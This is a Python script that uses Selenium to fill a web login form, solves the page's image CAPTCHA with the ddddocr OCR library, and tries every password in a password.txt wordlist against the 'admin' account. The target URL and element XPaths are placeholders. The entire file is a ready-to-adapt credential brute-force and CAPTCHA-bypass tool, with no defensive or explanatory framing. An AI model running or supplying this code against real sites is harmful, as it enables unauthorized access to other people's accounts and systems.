import os
import ddddocr
from time import sleep
from PIL import Image
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException

class GetVerificationCode:
    def __init__(self):
        self.res = None
        self.url = 'target_url'  # Replace with the actual URL
        self.driver = webdriver.Chrome()
        self.driver.maximize_window()
        self.driver.get(self.url)

    def getVerification(self):
        current_location = os.path.dirname(__file__)
        screenshot_path = os.path.join(current_location, "..", "VerificationCode")
        os.makedirs(screenshot_path, exist_ok=True)

        sleep(1)
        self.driver.save_screenshot(os.path.join(screenshot_path, 'printscreen.png'))
        
        # XPath for the captcha image
        imgelement = WebDriverWait(self.driver, 10).until(
            EC.visibility_of_element_located((By.XPATH, '//*[@id="captcha-image"]'))  # Modify this XPath as needed
        )
        location = imgelement.location
        size = imgelement.size
        rangle = (
            int(location['x']),
            int(location['y']),
            int(location['x'] + size['width']),
            int(location['y'] + size['height'])
        )

        i = Image.open(os.path.join(screenshot_path, 'printscreen.png'))
        fimg = i.crop(rangle)
        fimg = fimg.convert('RGB')
        fimg.save(os.path.join(screenshot_path, 'code.png'))

        ocr = ddddocr.DdddOcr()
        with open(os.path.join(screenshot_path, 'code.png'), 'rb') as f:
            img_bytes = f.read()
        self.res = ocr.classification(img_bytes)
        print('Recognized as: ' + self.res)

    def isElementPresent(self, by, value):
        try:
            self.driver.find_element(by=by, value=value)
            return True
        except NoSuchElementException:
            return False

    def check_login_success(self):
        # XPath for checking login success
        return self.isElementPresent(By.XPATH, '//*[@id="welcome-message"]')  # Modify as needed

    def login(self):
        max_retries = 5
        for attempt in range(max_retries):
            self.getVerification()

            # XPath for username input field
            self.driver.find_element(By.XPATH, '//*[@id="username"]').send_keys('admin')  # Modify as needed
            # XPath for captcha input field
            self.driver.find_element(By.XPATH, '//*[@id="captcha-input"]').send_keys(self.res)  # Modify as needed

            with open(r"password.txt", 'r') as file: #put in your password txt file here
                passwords = file.readlines()

            for password in passwords:
                password = password.strip()
                # XPath for password input field
                self.driver.find_element(By.XPATH, '//*[@id="password"]').clear()  # Modify as needed
                self.driver.find_element(By.XPATH, '//*[@id="password"]').send_keys(password)  # Modify as needed
                sleep(1)
                # XPath for login button
                self.driver.find_element(By.XPATH, '//*[@id="login-button"]').click()  # Modify as needed
                sleep(2)

                if self.check_login_success():
                    print(f"Successfully logged in with password: {password}")
                    return
                else:
                    print(f"Login failed with password: {password}")

            # XPath for captcha error message
            if self.isElementPresent(By.XPATH, '//*[@id="captcha-error"]'):  # Modify as needed
                codeText = self.driver.find_element(By.XPATH, '//*[@id="captcha-error"]').text
                if codeText == "Incorrect verification code":
                    print("Incorrect verification code, re-fetching...")
                    continue

        print("Maximum login attempts reached, exiting.")
        self.driver.quit()

if __name__ == '__main__':
    GetVerificationCode().login()